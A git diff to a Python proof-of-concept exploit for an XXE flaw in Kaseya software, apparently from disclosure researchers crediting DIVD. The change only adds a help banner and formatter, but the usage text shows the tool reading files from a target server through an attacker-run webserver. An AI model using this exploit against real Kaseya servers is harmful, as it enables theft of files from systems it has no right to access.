@@ -20,6 +20,7 @@ import urllib.parse
 import requests
 import threading
 import argparse
+from argparse import RawTextHelpFormatter
 from urllib.parse import urlencode
 import codecs
 import urllib3
@@ -104,7 +105,24 @@ def run(serverIp, port, server_class=HTTPServer, handler_class=XXE):
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(
         __file__,
-        description="Exploit POC for Kaseya XXE.",
+        description="""
+Exploit POC for Kaseya XXE.
+#############
+# SOME DISCLAIMER HERE
+# WIETSE FOUND IT
+# DIVD STUFF
+# DONATE LINK
+# 
+#  _____ _______      _______         _ 
+# |  __ \_   _\ \    / /  __ \       | |
+# | |  | || |  \ \  / /| |  | | _ __ | |
+# | |  | || |   \ \/ / | |  | || '_ \| |
+# | |__| || |_   \  /  | |__| || | | | |
+# |_____/_____|   \/   |_____(_)_| |_|_|                                     
+#
+#############
+""",
+formatter_class=RawTextHelpFormatter,
         usage="""
     python3 %(prog)s -f [file/dir on target to request] -i [ip of attacker webserver] -p [port of attacker webserver] -u [Kaseya server] -o [outputfile]
     
